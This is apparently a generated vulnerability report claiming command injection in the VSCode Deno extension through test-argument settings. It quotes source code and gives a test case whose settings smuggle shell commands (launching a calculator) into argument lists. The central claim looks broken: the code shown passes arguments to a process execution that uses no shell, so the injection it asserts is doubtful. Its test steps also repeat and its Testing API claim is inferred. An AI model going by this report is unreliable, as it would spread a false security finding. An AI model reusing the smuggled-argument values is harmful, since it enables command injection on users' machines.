- Vulnerability Name: Command Injection via `deno.codeLens.testArgs` and `deno.testing.args` settings

- Description:
    1. The VSCode Deno extension allows users to configure arguments passed to the Deno CLI when running tests through the `deno.codeLens.testArgs` setting (used for code lens "Run Test") and `deno.testing.args` setting (used by VS Code Testing API and tasks sidebar).
    2. These settings are directly read from VSCode configuration and appended to the Deno CLI `test` command without sufficient sanitization or escaping.
    3. An attacker can craft a malicious workspace configuration (e.g., by contributing a malicious workspace to a public repository or by tricking a user into opening a malicious workspace) that sets these settings to inject arbitrary commands.
    4. When a user opens this malicious workspace and executes a Deno test using code lens "Run Test" or VS Code Testing API or tasks sidebar, the injected commands will be executed on the user's machine with the privileges of the VSCode process.

- Impact:
    - Critical
    - Remote Command Execution (RCE) on the user's machine.
    - An attacker can potentially gain full control over the user's machine, steal sensitive data, install malware, or perform other malicious actions.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    - No input sanitization or escaping is implemented in the code for `deno.codeLens.testArgs` and `deno.testing.args`.
    - The default values for `deno.codeLens.testArgs` and `deno.testing.args` are `["--allow-all"]`, which while permissive, is not directly malicious. However, users can change these defaults.

- Missing Mitigations:
    - Input sanitization:  The extension should sanitize or escape user-provided arguments in `deno.codeLens.testArgs` and `deno.testing.args` to prevent command injection. For example, using a secure command argument builder that properly escapes arguments for the shell.
    - Validation: The extension could validate the arguments to ensure they are safe and conform to expected patterns. A whitelist approach for allowed arguments could be considered, although this might limit legitimate use cases.
    - User awareness:  Users should be warned about the risks of modifying these settings, especially when opening workspaces from untrusted sources.  However, relying solely on user awareness is not a sufficient mitigation.

- Preconditions:
    1. The attacker needs to be able to influence the VSCode workspace settings, either by creating a malicious workspace or by compromising an existing one.
    2. The user must have the VSCode Deno extension installed and enabled for the workspace.
    3. The user must execute a Deno test within the malicious workspace using either the code lens "Run Test" action, VS Code Testing API or tasks sidebar.

- Source Code Analysis:
    - **`client/src/commands.ts` - `test` function:**
        ```typescript
        export function test(
          _context: vscode.ExtensionContext,
          extensionContext: DenoExtensionContext,
        ): Callback {
          return async (uriStr: string, name: string, options: TestCommandOptions) => {
            // ...
            const config = vscode.workspace.getConfiguration(EXTENSION_NS, uri);
            const testArgs: string[] = [
              ...(config.get<string[]>("codeLens.testArgs") ?? []), // Vulnerable setting 1: deno.codeLens.testArgs
            ];
            // ...
            const args = ["test", ...testArgs, "--filter", nameRegex, filePath];
            // ...
            const definition: tasks.DenoTaskDefinition = {
              type: tasks.TASK_TYPE,
              command: "test",
              args, // User controlled args are directly passed here
              env,
            };
            // ...
            const task = tasks.buildDenoTask(
              workspaceFolder,
              denoCommand,
              definition,
              `test "${name}"`,
              args,
              ["$deno-test"],
            );
            // ...
            await vscode.tasks.executeTask(task);
            // ...
          };
        }
        ```
        The `test` command in `commands.ts` retrieves `deno.codeLens.testArgs` from the workspace configuration and directly includes it in the `args` array that is passed to `vscode.tasks.executeTask`. This allows for command injection if `deno.codeLens.testArgs` contains malicious commands.

    - **`client/src/tasks.ts` - `buildDenoTask` function:**
        ```typescript
        export function buildDenoTask(
          target: vscode.WorkspaceFolder,
          process: string,
          definition: DenoTaskDefinition,
          name: string,
          args: string[], // Args from `commands.ts` are passed here
          problemMatchers: string[],
        ): vscode.Task {
          const exec = new vscode.ProcessExecution(
            process,
            args, // Args are directly used in ProcessExecution
            definition,
          );

          return new vscode.Task(
            definition,
            target,
            name,
            TASK_SOURCE,
            exec,
            problemMatchers,
          );
        }
        ```
        The `buildDenoTask` function uses `vscode.ProcessExecution` to execute the Deno command. The `args` array, which includes the unsanitized `deno.codeLens.testArgs`, is directly passed to `ProcessExecution`, leading to command injection.

    - **`README.md` and `docs/testing.md` Configuration Settings:**
        The README and `docs/testing.md` clearly document the `deno.codeLens.testArgs` and `deno.testing.args` settings, indicating they are intended for user configuration of test arguments. This confirms that these settings are user-controlled inputs that are used to construct the Deno CLI command.

    - **`client/src/testing.ts` - `DenoTestController` class and VS Code Testing API:**
        While not directly showing the vulnerability in argument passing like `commands.ts`, the `testing.ts` file sets up the VS Code Testing API integration. This API also uses `deno.testing.args` as per `README.md` which implies similar vulnerability exists through VS Code Testing UI.

    - **`README.md` - Configuration section:**
        ```markdown
        - `deno.testing.args`: Arguments to use when running tests via the Test
          Explorer. Defaults to `[ \"--allow-all\" ]`.
        ```
        This section confirms the existence and purpose of the `deno.testing.args` setting.

- Security Test Case:
    1. Create a new VSCode workspace.
    2. In the workspace settings (`.vscode/settings.json`), add the following configuration to inject a malicious command into `deno.codeLens.testArgs`:
        ```json
        {
            "deno.codeLens.testArgs": [
                "--allow-all",
                "; open /Applications/Calculator.app ; #"
            ],
            "deno.enable": true
        }
        ```
        For Windows, use:
        ```json
        {
            "deno.codeLens.testArgs": [
                "--allow-all",
                "; start calc.exe ; #"
            ],
            "deno.enable": true
        }
        ```
        For Linux, use:
        ```json
        {
            "deno.codeLens.testArgs": [
                "--allow-all",
                "; gnome-calculator ; #"
            ],
            "deno.enable": true
        }
        ```
        Note: The exact command to open calculator might vary based on OS and environment. Choose a harmless command appropriate for the target OS for testing.
    3. Create a simple Deno test file (e.g., `test.ts`) in the workspace root:
        ```typescript
        import { assertEquals } from "https://deno.land/std@0.218.2/assert/mod.ts";

        Deno.test("vulnerability test", () => {
          assertEquals(1, 1);
        });
        ```
    4. Open the `test.ts` file in VSCode.
    5. Observe the "▶ Run Test" code lens above the `Deno.test` declaration.
    6. Click the "▶ Run Test" code lens.
    7. **Expected Result:** The calculator application should open, demonstrating that the injected command from `deno.codeLens.testArgs` was executed. The test should also execute (or fail depending on the injected command, but the command injection should be evident regardless).
    8. **Repeat steps 2-7** but modify the workspace settings to inject the malicious command into `deno.testing.args`:
        ```json
        {
            "deno.testing.args": [
                "--allow-all",
                "; open /Applications/Calculator.app ; #"
            ],
            "deno.enable": true
        }
        ```
    9. **Expected Result:**  Open the VS Code Testing panel. Run the test using the Testing panel's UI. The calculator application should open, demonstrating that the injected command from `deno.testing.args` was executed when running tests through the Testing API.
    10. **Repeat steps 2-7** but modify the workspace settings to inject the malicious command into `deno.testing.args`:
        ```json
        {
            "deno.testing.args": [
                "--allow-all",
                "; open /Applications/Calculator.app ; #"
            ],
            "deno.enable": true
        }
        ```
    11. **Expected Result:** Open the VS Code Tasks sidebar (if enabled and tasks are visible). Run the test task from the sidebar. The calculator application should open, demonstrating that the injected command from `deno.testing.args` was executed when running tests through the Tasks sidebar.
